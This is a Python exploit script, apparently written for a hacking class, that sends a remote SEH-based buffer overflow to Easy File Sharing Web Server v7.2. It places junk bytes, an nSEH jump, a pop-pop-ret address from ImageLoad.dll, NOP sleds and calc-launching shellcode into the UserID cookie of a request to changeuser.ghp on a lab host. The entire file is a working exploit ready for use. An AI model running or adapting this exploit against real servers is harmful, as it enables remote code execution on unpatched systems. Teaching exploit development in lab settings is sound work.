#!/usr/bin/python3
import urllib.request
#
#
# Exploit for Easy File Sharing Web Server v7.2
# Remote SEH Based Overflow
# Tested on Windows 7 x86
# Used for Hacking Techniques Class
# Written by: B!n@ry
# Contact: https://twitter.com/binaryz0ne
#
#
#https://github.com/peterferrie/win-exec-calc-shellcode
calc = ("\x31\xd2\x52\x68\x63\x61\x6c\x63\x54\x59\x52\x51\x64\x8b\x72" +
"\x30\x8b\x76\x0c\x8b\x76\x0c\xad\x8b\x30\x8b\x7e\x18\x8b\x5f" +
"\x3c\x8b\x5c\x1f\x78\x8b\x74\x1f\x20\x01\xfe\x8b\x54\x1f\x24" +
"\x0f\xb7\x2c\x17\x42\x42\xad\x81\x3c\x07\x57\x69\x6e\x45\x75" +
"\xf0\x8b\x74\x1f\x1c\x01\xfe\x03\x3c\xae\xff\xd7")

junk = "A" * 4059
nseh = "\xeb\x0a\x90\x90"
seh = "\xb6\x2b\x02\x10"	# 0x10022bb6 from ImageLoad.dll
nops1 = 30 * "\x90"
nops2 = (4258 - len(junk+nseh+seh+nops1+calc)) * "\x90"

buf = junk + nseh + seh + nops1 + calc + nops2


print ("Sending data!")
r = urllib.request.Request("http://192.168.56.100/changeuser.ghp")
r.add_header("User-Agent", "Blah Blah 1.0")
r.add_header('Host','192.168.56.100')
r.add_header("Accept", "text/html")
r.add_header('Accept-Language','en-us')
r.add_header("Cookie","SESSIONID=0; UserID=" + buf + "; PassWD=BLAHBLAH")
r.add_header('Conection','Keep-Alive')
req = urllib.request.urlopen(r)
print ("Sending Done!")
